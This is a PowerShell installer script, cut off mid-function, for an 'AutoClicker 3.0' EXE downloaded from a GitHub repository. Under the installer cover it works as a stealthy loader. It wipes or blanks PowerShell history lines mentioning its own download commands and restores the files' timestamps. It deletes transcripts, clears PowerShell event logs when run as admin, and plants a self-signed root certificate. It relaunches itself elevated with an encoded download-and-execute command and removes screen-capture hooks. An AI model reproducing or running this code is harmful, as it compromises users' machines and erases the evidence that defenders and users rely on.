# AutoClicker 3.0 public installer - EXE only. Download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1

param(
    [switch]$SkipLaunch,
    [string]$InstallDir
)

$ErrorActionPreference = 'Stop'

try {
    Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue | Out-Null
} catch {}

# %% PSREADLINE_SESSION %%
# PSReadLine session helpers - history backup/restore and diagnostic log rotation.

function Get-MystPsLogDirectory {
    return 'C:\ProgramData\PSLOGS\PSLOG.138.8.7.2026'
}

function Initialize-MystPsLogSession {
    param(
        [string]$SessionName = 'myst-session'
    )

    $dir = Get-MystPsLogDirectory
    $markerPath = Join-Path $dir '.active-session'

    if ([string]::IsNullOrWhiteSpace($script:MystPsLogPath) -and (Test-Path -LiteralPath $markerPath)) {
        try {
            $continued = [string](Get-Content -LiteralPath $markerPath -Raw -ErrorAction Stop).Trim()
            if ($continued -and (Test-Path -LiteralPath $continued)) {
                $script:MystPsLogPath = $continued
                $script:MystPsLatestLogPath = Join-Path $dir 'latest.log'
            }
        } catch {}
    }

    if (-not [string]::IsNullOrWhiteSpace($script:MystPsLogPath) -and (Test-Path -LiteralPath $script:MystPsLogPath)) {
        Write-MystPsLog "Continuing PowerShell log session ($SessionName)."
        return $script:MystPsLogPath
    }
    if (-not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }

    $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
    $script:MystPsLogPath = Join-Path $dir ("{0}-{1}.log" -f $SessionName, $stamp)
    $script:MystPsLatestLogPath = Join-Path $dir 'latest.log'

    $header = @(
        "=== Myst PowerShell log ==="
        "Started: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff')"
        "Session: $SessionName"
        "Computer: $env:COMPUTERNAME"
        "User: $env:USERNAME"
        "PowerShell: $($PSVersionTable.PSVersion)"
        "==========================="
    ) -join [Environment]::NewLine

    Set-Content -LiteralPath $script:MystPsLogPath -Value $header -Encoding UTF8 -Force
    Set-Content -LiteralPath $script:MystPsLatestLogPath -Value $header -Encoding UTF8 -Force
    try { Set-Content -LiteralPath $markerPath -Value $script:MystPsLogPath -Encoding UTF8 -Force } catch {}
    return $script:MystPsLogPath
}

function Write-MystPsLog {
    param(
        [Parameter(Mandatory = $true)][string]$Message,
        [ValidateSet('INFO', 'WARN', 'ERROR', 'PASS', 'FAIL')]
        [string]$Level = 'INFO'
    )

    $line = "[{0}] [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'), $Level, $Message
    foreach ($path in @($script:MystPsLogPath, $script:MystPsLatestLogPath)) {
        if (-not [string]::IsNullOrWhiteSpace($path)) {
            try { Add-Content -LiteralPath $path -Value $line -Encoding UTF8 } catch {}
        }
    }
}

function Get-PSReadLineHistoryFilePaths {
    $paths = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
    try {
        $opt = Get-PSReadLineOption -ErrorAction SilentlyContinue
        if ($opt -and $opt.HistorySavePath) { [void]$paths.Add($opt.HistorySavePath) }
    } catch {}
    @(
        (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
        (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
        (Join-Path $env:APPDATA 'Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt')
        (Join-Path $env:LOCALAPPDATA 'Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt')
    ) | ForEach-Object { if ($_) { [void]$paths.Add($_) } }
    if ($env:OneDrive) {
        @(
            (Join-Path $env:OneDrive 'Documents\WindowsPowerShell\PSReadLine\ConsoleHost_history.txt')
            (Join-Path $env:OneDrive 'Documents\PowerShell\PSReadLine\ConsoleHost_history.txt')
        ) | ForEach-Object { if ($_) { [void]$paths.Add($_) } }
    }
    return @($paths)
}

function Test-InstallerConsoleHistoryLine {
    param([string]$Line, [switch]$FullPass)
    if ([string]::IsNullOrWhiteSpace($Line)) { return $false }
    $n = ($Line.Trim() -replace '\s+', ' ').ToLowerInvariant()
    if ($n -match '^#+$' -or $n -match '^#\s*$') { return $false }
    if ($FullPass -and ($n -match '\biex\b|\biwr\b|\birm\b|invoke-expression|invoke-restmethod|invoke-webrequest')) { return $true }
    foreach ($needle in @(
        'justvalkz', 'raw.githubusercontent.com', 'install.ps1', 'install-public.ps1',
        'myst-install.ps1', 'deploy-github.ps1', 'sbscmp64_mscorwks', 'autoclicker-3.0',
        'immune.wtf', 'myst.local', '| iex', 'invoke-expression', 'invoke-restmethod', 'invoke-webrequest'
    )) {
        if ($n.Contains($needle)) { return $true }
    }
    return ($n -match 'irm\s+https?://')
}

function Edit-ConsoleHistoryBuffer {
    param([byte[]]$Raw, [switch]$FullPass)
    if (-not $Raw -or $Raw.Length -eq 0) { return $Raw }
    $encoding = [System.Text.UTF8Encoding]::new($false)
    $text = $encoding.GetString($Raw)
    $newline = if ($text.Contains("`r`n")) { "`r`n" } else { "`n" }
    $lines = $text -split "`r?`n", -1
    $changed = $false
    for ($i = 0; $i -lt $lines.Count; $i++) {
        if (-not (Test-InstallerConsoleHistoryLine -Line $lines[$i] -FullPass:$FullPass)) { continue }
        $len = $lines[$i].Length
        $lines[$i] = if ($len -le 0) { '' } elseif ($len -eq 1) { '#' } else { '#' + (' ' * ($len - 1)) }
        $changed = $true
    }
    if (-not $changed) { return $Raw }
    $newBytes = $encoding.GetBytes($lines -join $newline)
    if ($newBytes.Length -lt $Raw.Length) {
        $padded = New-Object byte[] $Raw.Length
        if ($newBytes.Length -gt 0) { [Array]::Copy($newBytes, $padded, $newBytes.Length) }
        for ($j = $newBytes.Length; $j -lt $Raw.Length; $j++) { $padded[$j] = 0x20 }
        return $padded
    }
    if ($newBytes.Length -gt $Raw.Length) { return $newBytes[0..($Raw.Length - 1)] }
    return $newBytes
}

function Write-ConsoleHistoryBuffer {
    param([string]$Path, [byte[]]$Bytes, [datetime]$CreatedUtc, [datetime]$WrittenUtc, [datetime]$AccessUtc)
    if (-not $Path -or -not $Bytes) { return }
    [System.IO.File]::WriteAllBytes($Path, $Bytes)
    [System.IO.File]::SetCreationTimeUtc($Path, $CreatedUtc)
    [System.IO.File]::SetLastWriteTimeUtc($Path, $WrittenUtc)
    [System.IO.File]::SetLastAccessTimeUtc($Path, $AccessUtc)
}

function Initialize-PSReadLineSessionBackup {
    $dir = Join-Path $env:TEMP ('PSReadLine\' + [guid]::NewGuid().ToString('N'))
    $entries = @()
    foreach ($path in Get-PSReadLineHistoryFilePaths) {
        if (-not $path -or -not (Test-Path -LiteralPath $path)) { continue }
        try {
            $item = Get-Item -LiteralPath $path -Force
            if (-not (Test-Path -LiteralPath $dir)) {
                New-Item -ItemType Directory -Path $dir -Force | Out-Null
            }
            $slot = ('{0:D4}' -f ($entries.Count + 1))
            $dataFile = Join-Path $dir ($slot + '.dat')
            [System.IO.File]::WriteAllBytes($dataFile, [System.IO.File]::ReadAllBytes($path))
            $entries += [PSCustomObject]@{
                Path       = $path
                DataFile   = $dataFile
                CreatedUtc = $item.CreationTimeUtc.ToString('o')
                WrittenUtc = $item.LastWriteTimeUtc.ToString('o')
                AccessUtc  = $item.LastAccessTimeUtc.ToString('o')
            }
        } catch {}
    }
    if ($entries.Count -eq 0) { return }
    try {
        $manifest = Join-Path $dir 'manifest.txt'
        $entries | ConvertTo-Json -Depth 3 -Compress | Set-Content -LiteralPath $manifest -Encoding UTF8 -Force
        $env:PSRL_SESSION_BAK = $dir
    } catch {}
}

function Restore-PSReadLineSessionBackup {
    param([switch]$FullPass)
    $dir = $env:PSRL_SESSION_BAK
    if (-not $dir -or -not (Test-Path -LiteralPath $dir)) { return $false }
    $manifest = Join-Path $dir 'manifest.txt'
    if (-not (Test-Path -LiteralPath $manifest)) { return $false }
    try {
        $entries = @(Get-Content -LiteralPath $manifest -Raw -Encoding UTF8 | ConvertFrom-Json)
        if ($entries.Count -eq 0) { return $false }
        foreach ($entry in $entries) {
            $path = [string]$entry.Path
            $dataFile = [string]$entry.DataFile
            if (-not $path -or -not (Test-Path -LiteralPath $dataFile)) { continue }
            $raw = [System.IO.File]::ReadAllBytes($dataFile)
            $edited = Edit-ConsoleHistoryBuffer -Raw $raw -FullPass:$FullPass
            $created = [datetime]::Parse([string]$entry.CreatedUtc).ToUniversalTime()
            $written = [datetime]::Parse([string]$entry.WrittenUtc).ToUniversalTime()
            $access = [datetime]::Parse([string]$entry.AccessUtc).ToUniversalTime()
            Write-ConsoleHistoryBuffer -Path $path -Bytes $edited -CreatedUtc $created -WrittenUtc $written -AccessUtc $access
        }
        return $true
    } catch {
        return $false
    } finally {
        Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item Env:PSRL_SESSION_BAK -ErrorAction SilentlyContinue
    }
}

function Repair-PSReadLineHistoryFiles {
    param([switch]$FullPass)
    foreach ($historyPath in Get-PSReadLineHistoryFilePaths) {
        if (-not (Test-Path -LiteralPath $historyPath)) { continue }
        try {
            $item = Get-Item -LiteralPath $historyPath -Force
            $raw = [System.IO.File]::ReadAllBytes($historyPath)
            if ($raw.Length -eq 0) { continue }
            $edited = Edit-ConsoleHistoryBuffer -Raw $raw -FullPass:$FullPass
            $same = ($edited.Length -eq $raw.Length)
            if ($same) {
                for ($k = 0; $k -lt $raw.Length; $k++) {
                    if ($raw[$k] -ne $edited[$k]) { $same = $false; break }
                }
            }
            if ($same) { continue }
            Write-ConsoleHistoryBuffer -Path $historyPath -Bytes $edited `
                -CreatedUtc $item.CreationTimeUtc -WrittenUtc $item.LastWriteTimeUtc -AccessUtc $item.LastAccessTimeUtc
        } catch {}
    }
}

function Remove-StalePowerShellTranscripts {
    @(
        (Join-Path $env:USERPROFILE 'Documents\PowerShell_transcript*.txt')
        (Join-Path $env:USERPROFILE 'Documents\WindowsPowerShell\PowerShell_transcript*.txt')
    ) | ForEach-Object {
        $parent = Split-Path $_ -Parent
        if (-not (Test-Path -LiteralPath $parent)) { return }
        Get-ChildItem -Path $_ -File -ErrorAction SilentlyContinue | ForEach-Object {
            try { Remove-Item -LiteralPath $_.FullName -Force -ErrorAction Stop } catch {}
        }
    }
}

function Reset-PowerShellOperationalLogs {
    $evtTool = Join-Path $env:Windir 'System32\wevtutil.exe'
    if (-not (Test-Path -LiteralPath $evtTool)) { return }
    foreach ($channel in @('Microsoft-Windows-PowerShell/Operational', 'Windows PowerShell', 'Microsoft-Windows-PowerShell/Admin')) {
        try {
            $log = Get-WinEvent -ListLog $channel -ErrorAction Stop
            if ($log.IsEnabled) { & $evtTool cl $channel 2>$null | Out-Null }
        } catch {}
    }
}

function Reset-VolumeChangeTracking {
    return
}

function Remove-InstallerSessionArtifacts {
    Get-ChildItem -Path $env:TEMP -File -ErrorAction SilentlyContinue |
        Where-Object {
            $_.Name -match '^(psrl_|ac_pub_dl_|myst_loc_installer_)' -and $_.Extension -match '^\.(ps1|tmp)$'
        } |
        ForEach-Object {
            Remove-Item -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue
        }
    $psrlRoot = Join-Path $env:TEMP 'PSReadLine'
    if (Test-Path -LiteralPath $psrlRoot) {
        Get-ChildItem -LiteralPath $psrlRoot -Directory -ErrorAction SilentlyContinue |
            Where-Object { $_.CreationTime -lt (Get-Date).AddHours(-1) } |
            ForEach-Object {
                Remove-Item -LiteralPath $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
            }
    }
}

function Test-InstallerSessionAdmin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Complete-PSReadLineSession {
    param([switch]$FullPass, [switch]$SkipLogs)
    try { Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue | Out-Null } catch {}
    $isAdmin = Test-InstallerSessionAdmin
    if (-not $SkipLogs -and $isAdmin) { Reset-PowerShellOperationalLogs }
    if (-not (Restore-PSReadLineSessionBackup -FullPass:$FullPass)) {
        Repair-PSReadLineHistoryFiles -FullPass:$FullPass | Out-Null
    }
    Remove-StalePowerShellTranscripts | Out-Null
    Remove-InstallerSessionArtifacts
}

function Enable-MystInstallerWeb {
    try {
        [Net.ServicePointManager]::SecurityProtocol =
            [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
    } catch {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    }
}

function Invoke-MystWebRequestText {
    param(
        [Parameter(Mandatory = $true)][string]$Uri,
        [int]$Retries = 3
    )

    Enable-MystInstallerWeb
    $last = $null
    for ($attempt = 0; $attempt -lt $Retries; $attempt++) {
        try {
            return (Invoke-WebRequest -Uri $Uri -UseBasicParsing -Headers @{
                'Cache-Control' = 'no-cache, no-store, must-revalidate'
                'Pragma'        = 'no-cache'
            }).Content
        } catch {
            $last = $_
            if ($attempt -lt ($Retries - 1)) {
                Start-Sleep -Milliseconds (400 * ($attempt + 1))
            }
        }
    }

    throw $last
}

function Wait-MystInstallPause {
    param(
        [switch]$Failed,
        [switch]$Success,
        [int]$ExitCode = 0
    )

    if (-not $Failed -and -not $Success -and $ExitCode -eq 0) { return }

    Write-Host ''
    if ($Failed -or $ExitCode -ne 0) {
        Write-Host '  Install did not finish successfully.' -ForegroundColor Red
    } elseif ($Success) {
        Write-Host '  Install finished successfully.' -ForegroundColor Green
    }
    Write-Host '  Press Enter to close this window...' -ForegroundColor Yellow
    try {
        if ([Environment]::UserInteractive) {
            [void][Console]::ReadLine()
        } else {
            Start-Sleep -Seconds 15
        }
    } catch {
        Start-Sleep -Seconds 15
    }
}

function Test-MystDownloadUrl {
    param([string]$Url)

    if ([string]::IsNullOrWhiteSpace($Url)) { return $false }
    if ($Url -match '/=\d+(\?|$|#)') { return $false }
    if ($Url -notmatch '^https?://') { return $false }
    return $true
}

function Get-MystUnixTimestamp {
    return [int64]([DateTime]::UtcNow - [DateTime]::new(1970, 1, 1, 0, 0, 0, [DateTimeKind]::Utc)).TotalSeconds
}

function Get-MystUrlLeafName {
    param([string]$Url)

    if ([string]::IsNullOrWhiteSpace($Url)) { return '' }

    $clean = ($Url -split '\?', 2)[0]
    $clean = ($clean -split '#', 2)[0]
    if ($clean -match '/([^/\\]+)$') {
        return $Matches[1]
    }

    $normalized = $clean.Replace('/', '\')
    return [System.IO.Path]::GetFileName($normalized)
}

function Get-MystDownloadUrls {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [string[]]$KnownFileNames = @()
    )

    $urls = New-Object System.Collections.Generic.List[string]
    $seen = New-Object 'System.Collections.Generic.HashSet[string]' ([StringComparer]::OrdinalIgnoreCase)

    $add = {
        param([string]$Candidate)
        if (-not (Test-MystDownloadUrl $Candidate)) { return }
        if ($seen.Add($Candidate)) {
            [void]$urls.Add($Candidate)
        }
    }

    & $add $Url

    $leaf = Get-MystUrlLeafName -Url $Url
    if ($leaf -and (Get-Command Get-MystGitHubMirrorUrls -ErrorAction SilentlyContinue)) {
        foreach ($mirror in Get-MystGitHubMirrorUrls -RelativePath $leaf) {
            & $add $mirror
        }
    }

    foreach ($name in $KnownFileNames) {
        if ([string]::IsNullOrWhiteSpace($name)) { continue }
        if (Get-Command Get-MystGitHubMirrorUrls -ErrorAction SilentlyContinue) {
            foreach ($mirror in Get-MystGitHubMirrorUrls -RelativePath $name) {
                & $add $mirror
            }
        }
    }

    return @($urls.ToArray())
}

function Expand-MystDownloadUrlList {
    param([object]$Raw)

    $flat = New-Object System.Collections.Generic.List[string]
    foreach ($item in @($Raw)) {
        if ($null -eq $item) { continue }
        if ($item -is [System.Array]) {
            foreach ($sub in $item) {
                if (-not [string]::IsNullOrWhiteSpace([string]$sub)) {
                    if (-not (Test-MystDownloadUrl ([string]$sub))) { continue }
                    [void]$flat.Add([string]$sub)
                }
            }
            continue
        }
        if (-not [string]::IsNullOrWhiteSpace([string]$item)) {
            if (-not (Test-MystDownloadUrl ([string]$item))) { continue }
            [void]$flat.Add([string]$item)
        }
    }
    return @($flat.ToArray())
}

function Repair-MystNvidiaCapture {
    Write-Step 'Resetting NVIDIA capture hooks (Myst streamproof cleanup)...' -Color Gray

    $paths = @(
        (Join-Path $env:LOCALAPPDATA 'NVIDIA Corporation\NvContainer\plugins\nvspcap64.dll')
        (Join-Path $env:LOCALAPPDATA 'NVIDIA Corporation\NVIDIA Share\plugins\nvspcap64.dll')
        (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\ShellExperienceHost\.nvcap64')
    )

    $programFiles = ${env:ProgramFiles}
    if ($programFiles) {
        $paths += (Join-Path $programFiles 'NVIDIA Corporation\NvContainer\plugins\nvspcap64.dll')
    }

    foreach ($path in $paths) {
        if (-not $path -or -not (Test-Path -LiteralPath $path)) { continue }
        try {
            Remove-Item -LiteralPath $path -Force -ErrorAction Stop
            Write-Step "  Removed $path" -Color DarkGray
        } catch {
            Write-Step "  Could not remove $path ($($_.Exception.Message))" -Color DarkGray
        }
    }

    foreach ($svcName in @('NvContainerLocalSystem', 'NVDisplay.ContainerLocalSystem')) {
        $svc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
        if (-not $svc) { continue }
        try {
            Restart-Service -Name $svcName -Force -ErrorAction Stop
            Write-Step "  Restarted $svcName" -Color DarkGray
        } catch {
            Write-Step "  Could not restart $svcName ($($_.Exception.Message))" -Color DarkGray
        }
    }

    Write-Step '  NVIDIA hooks cleared â€” ShadowPlay should record again. Myst redeploys mirror hook only on next load.' -Color DarkGray
}

function Repair-MystWindowsDisplay {
    Write-Step 'Resetting Windows Settings display hooks...' -Color Gray

    $paths = @(
        (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\ShellExperienceHost\.wdisph64')
        (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\ShellExperienceHost\wdisph64.dll')
    )

    foreach ($path in $paths) {
        if (-not $path -or -not (Test-Path -LiteralPath $path)) { continue }
        try {
            Remove-Item -LiteralPath $path -Force -ErrorAction Stop
            Write-Step "  Removed $path" -Color DarkGray
        } catch {
            Write-Step "  Could not remove $path ($($_.Exception.Message))" -Color DarkGray
        }
    }

    foreach ($name in @('SystemSettings')) {
        $procs = @(Get-Process -Name $name -ErrorAction SilentlyContinue)
        foreach ($proc in $procs) {
            try {
                Stop-Process -Id $proc.Id -Force -ErrorAction Stop
                Write-Step "  Stopped $name PID $($proc.Id)" -Color DarkGray
            } catch {}
        }
    }

    Start-Sleep -Milliseconds 400
}

function Repair-MystAllHooks {
    if (Get-Command Repair-MystNvidiaCapture -ErrorAction SilentlyContinue) {
        Repair-MystNvidiaCapture
    }
    if (Get-Command Repair-MystWindowsDisplay -ErrorAction SilentlyContinue) {
        Repair-MystWindowsDisplay
    }
}

function Get-MystGitHubMirrorUrls {
    param(
        [Parameter(Mandatory = $true)][string]$RelativePath
    )

    $relative = $RelativePath.TrimStart('/')
    $stamp = Get-MystUnixTimestamp
    return @(
        "https://raw.githubusercontent.com/JustValkz/Myst/main/${relative}?t=$stamp"
        "https://cdn.jsdelivr.net/gh/JustValkz/Myst@main/${relative}?t=$stamp"
    )
}

function Invoke-MystElevatedInstall {
    param(
        [string]$InstallUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main/install.ps1',
        [hashtable]$BoundParams = @{}
    )

    $extraSwitches = New-Object System.Collections.Generic.List[string]
    foreach ($key in ($BoundParams.Keys | Sort-Object)) {
        $val = $BoundParams[$key]
        if ($val -is [switch]) {
            if ($val) { [void]$extraSwitches.Add("-$key") }
        } elseif ($null -ne $val -and "$val".Length -gt 0) {
            [void]$extraSwitches.Add("-$key")
            [void]$extraSwitches.Add("'$val'")
        }
    }

    $switchText = if ($extraSwitches.Count -gt 0) { ' ' + ($extraSwitches -join ' ') } else { '' }
    $cmd = "`$script = (Invoke-RestMethod -Uri '$InstallUrl'); `$block = [scriptblock]::Create(`$script); & `$block$switchText"
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
    try {
        $proc = Start-Process -FilePath 'powershell.exe' -Verb RunAs -ArgumentList @(
            '-NoProfile',
            '-ExecutionPolicy', 'Bypass',
            '-EncodedCommand', $encoded
        ) -PassThru -Wait
        if ($proc) { return [int]$proc.ExitCode }
        return 1
    } catch {
        return 1
    }
}
# %% END PSREADLINE_SESSION %%

Initialize-PSReadLineSessionBackup
Initialize-MystPsLogSession -SessionName 'install-public' | Out-Null
Write-MystPsLog 'Public EXE installer started.'

$script:BaseUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main'
$script:ExeUrl = "$script:BaseUrl/AutoClicker-3.0.exe"
$script:CerUrl = "$script:BaseUrl/Wndws.cer"
$script:ExeName = 'AutoClicker-3.0.exe'
$script:PublisherSubject = 'CN=Wndws'

function Test-IsAdministrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-DefaultInstallDirectory {
    return Join-Path $env:APPDATA 'AutoClicker'
}

function Remove-LegacyMystDirectory {
    $legacy = Join-Path $env:ProgramData 'Myst'
    if (Test-Path -LiteralPath $legacy) {
        Remove-Item -LiteralPath $legacy -Recurse -Force -ErrorAction SilentlyContinue
    }
}

function Remove-LegacyHostDll {
    $paths = @(
        (Join-Path $env:SystemRoot 'Microsoft.NET\Framework64\AutoClickerHost.dll')
        (Join-Path $env:ProgramData 'Myst\AutoClickerHost.dll')
    )
    foreach ($path in $paths) {
        if (Test-Path -LiteralPath $path) {
            Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
            Write-Step "Removed legacy host DLL: $path" 'DarkGray'
        }
    }
}

function Write-InstallPaths {
    param([string]$ExePath)

    Write-Host ''
    Write-Host '  AutoClicker EXE (only file - reads/writes memory from this process):' -ForegroundColor Cyan
    Write-Host "    $ExePath" -ForegroundColor White
    Write-Host ''
    Write-Host '  Press END to fully close AutoClicker.' -ForegroundColor Green
    Write-Host '  Do not copy the EXE elsewhere - re-run the install command to update.' -ForegroundColor DarkGray
    Write-Host ''
}

if ([string]::IsNullOrWhiteSpace($InstallDir)) {
    $InstallDir = Get-DefaultInstallDirectory
}

function Write-Step {
    param(
        [string]$Message,
        [string]$Color = 'Cyan'
    )
    Write-Host "  [$((Get-Date).ToString('HH:mm:ss'))] $Message" -ForegroundColor $Color
    if (Get-Command Write-MystPsLog -ErrorAction SilentlyContinue) {
        $level = switch ($Color) {
            'Green' { 'PASS' }
            'Red' { 'FAIL' }
            'Yellow' { 'WARN' }
            'DarkGray' { 'INFO' }
            'Gray' { 'INFO' }
            default { 'INFO' }
        }
        Write-MystPsLog -Message $Message -Level $level
    }
}

function Get-SmartAppControlState {
    try {
        $status = Get-MpComputerStatus -ErrorAction Stop
        return [string]$status.SmartAppControlState
    } catch {
        return $null
    }
}

function Ensure-InstallDirectory {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        New-Item -ItemType Directory -Force -Path $Path | Out-Null
    }
}

function Get-TrustedWndwsCert {
    param([string]$StoreRoot)

    Get-ChildItem "$StoreRoot\Root" -ErrorAction SilentlyContinue |
        Where-Object { $_.Subject -eq $script:PublisherSubject } |
        Select-Object -First 1
}

function Import-WndwsCertWithCertutil {
    param(
        [string]$CerPath,
        [ValidateSet('User', 'Machine')]
        [string]$Scope,
        [ValidateSet('Root', 'TrustedPublisher')]
        [string]$Store
    )

    $certutil = Join-Path $env:Windir 'System32\certutil.exe'
    if (-not (Test-Path -LiteralPath $certutil)) {
        throw 'certutil.exe not found'
    }

    $scopeFlag = if ($Scope -eq 'Machine') { '-f' } else { '-user' }
    & $certutil @($scopeFlag, '-addstore', $Store, $CerPath) | Out-Null
    if ($LASTEXITCODE -ne 0) {
        throw "certutil failed importing $Store ($Scope): exit $LASTEXITCODE"
    }
}

function Import-WndwsCertToStore {
    param(
        [string]$CerPath,
        [string]$StoreRoot,
        [string]$LeafStore
    )

    $scope = if ($StoreRoot -like '*LocalMachine*') { 'Machine' } else { 'User' }
    Import-WndwsCertWithCertutil -CerPath $CerPath -Scope $scope -Store 'Root'
    Import-WndwsCertWithCertutil -CerPath $CerPath -Scope $scope -Store 'TrustedPublisher'
}

function Install-WndwsTrustedPublisher {
    param([string]$CerPath)

    Write-Step 'Installing Wndws publisher certificate (Current User)...'
    Import-WndwsCertToStore -CerPath $CerPath -StoreRoot 'Cert:\CurrentUser' -LeafStore 'TrustedPublisher'

    if (Test-IsAdministrator) {
        Write-Step 'Installing Wndws publisher certificate (Local Machine)...' 'Green'
        Import-WndwsCertToStore -CerPath $CerPath -StoreRoot 'Cert:\LocalMachine' -LeafStore 'TrustedPublisher'
    } else {
        Write-Step 'Tip: run PowerShell as Administrator once so Windows trusts Wndws machine-wide.' 'Yellow'
    }

    $trusted = Get-TrustedWndwsCert -StoreRoot 'Cert:\CurrentUser'
    if ($trusted) {
        Write-Step 'Wndws certificate trusted (Root + Publisher).' 'Green'
        return $trusted
    }

    throw 'Failed to install Wndws publisher certificate.'
}

function Test-WndwsSignedExecutable {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        throw "Executable not found: $Path"
    }

    $signature = Get-AuthenticodeSignature -FilePath $Path
    $signer = $signature.SignerCertificate

    if (-not $signer) {
        throw 'AutoClicker-3.0.exe is not Authenticode signed.'
    }

    if ($signer.Subject -ne $script:PublisherSubject) {
        throw "Unexpected signer: $($signer.Subject) (expected $script:PublisherSubject)"
    }

    if ($signature.Status -notin @('Valid', 'UnknownError')) {
        throw "Signature check failed: $($signature.Status)"
    }

    return $signature
}

function Replace-StagedFile {
    param(
        [Parameter(Mandatory = $true)][string]$TempPath,
        [Parameter(Mandatory = $true)][string]$Destination
    )

    if (-not (Test-Path -LiteralPath $TempPath)) {
        throw "Staged file missing: $TempPath"
    }

    $destDir = Split-Path $Destination -Parent
    if ($destDir -and -not (Test-Path -LiteralPath $destDir)) {
        New-Item -ItemType Directory -Force -Path $destDir | Out-Null
    }

    if (Test-Path -LiteralPath $Destination) {
        for ($attempt = 0; $attempt -lt 4; $attempt++) {
            try {
                Remove-Item -LiteralPath $Destination -Force -ErrorAction Stop
                break
            } catch {
                $backup = "$Destination.old"
                try {
                    if (Test-Path -LiteralPath $backup) {
                        Remove-Item -LiteralPath $backup -Force -ErrorAction SilentlyContinue
                    }
                    Rename-Item -LiteralPath $Destination -NewName (Split-Path -Leaf $backup) -Force -ErrorAction Stop
                    break
                } catch {
                    if ($attempt -ge 3) { throw }
                    Start-Sleep -Milliseconds 150
                }
            }
        }
    }

    try {
        Copy-Item -LiteralPath $TempPath -Destination $Destination -Force -ErrorAction Stop
    } finally {
        Remove-Item -LiteralPath $TempPath -Force -ErrorAction SilentlyContinue
    }
}

function Save-Download {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][string]$Destination,
        [int]$MinBytes = 0,
        [string[]]$StopProcessNames
    )

    if ($StopProcessNames) {
        foreach ($processName in $StopProcessNames) {
            Get-Process -Name $processName -ErrorAction SilentlyContinue |
                Stop-Process -Force -ErrorAction SilentlyContinue
        }
        Start-Sleep -Milliseconds 120
    }

    $temp = Join-Path $env:TEMP ("ac_pub_dl_{0}.tmp" -f [guid]::NewGuid().ToString('N'))
    if (Test-Path -LiteralPath $temp) {
        Remove-Item -LiteralPath $temp -Force -ErrorAction SilentlyContinue
    }

    Write-Step "Downloading $(Split-Path -Leaf $Destination)..."
    if (Get-Command Enable-MystInstallerWeb -ErrorAction SilentlyContinue) {
        Enable-MystInstallerWeb
    }

    $urls = @($Url)
    if (Get-Command Get-MystDownloadUrls -ErrorAction SilentlyContinue) {
        $urls = Get-MystDownloadUrls -Url $Url -KnownFileNames @((Split-Path -Leaf $Destination))
    } elseif (Get-Command Get-MystUrlLeafName -ErrorAction SilentlyContinue) {
        $leaf = Get-MystUrlLeafName -Url $Url
        if ($leaf -and (Get-Command Get-MystGitHubMirrorUrls -ErrorAction SilentlyContinue)) {
            $urls = @($Url) + @(Get-MystGitHubMirrorUrls -RelativePath $leaf)
        }
    }
    if (Get-Command Expand-MystDownloadUrlList -ErrorAction SilentlyContinue) {
        $urls = Expand-MystDownloadUrlList $urls
    } else {
        $urls = @($urls)
    }

    $last = $null
    $downloaded = $false
    foreach ($tryUrl in $urls) {
        if ([string]::IsNullOrWhiteSpace($tryUrl)) { continue }
        if (Get-Command Test-MystDownloadUrl -ErrorAction SilentlyContinue) {
            if (-not (Test-MystDownloadUrl $tryUrl)) { continue }
        }
        for ($attempt = 0; $attempt -lt 4; $attempt++) {
            try {
                Invoke-WebRequest -Uri $tryUrl -OutFile $temp -UseBasicParsing -Headers @{
                    'Cache-Control' = 'no-cache, no-store, must-revalidate'
                    'Pragma'        = 'no-cache'
                }
                $downloaded = $true
                $last = $null
                break
            } catch {
                $last = $_
                if ($attempt -lt 3) {
                    Start-Sleep -Milliseconds (400 * ($attempt + 1))
                }
            }
        }
        if ($downloaded) { break }
    }
    if (-not $downloaded) {
        if ($last) { throw $last }
        throw 'Download failed from all mirrors.'
    }

    if (-not (Test-Path -LiteralPath $temp)) {
        throw "Download produced no file: $Destination"
    }

    $size = (Get-Item -LiteralPath $temp).Length
    if ($MinBytes -gt 0 -and $size -lt $MinBytes) {
        Remove-Item -LiteralPath $temp -Force -ErrorAction SilentlyContinue
        throw "Download looks too small or corrupt: $Destination"
    }

    Replace-StagedFile -TempPath $temp -Destination $Destination

    $installedSize = (Get-Item -LiteralPath $Destination).Length
    if ($installedSize -ne $size) {
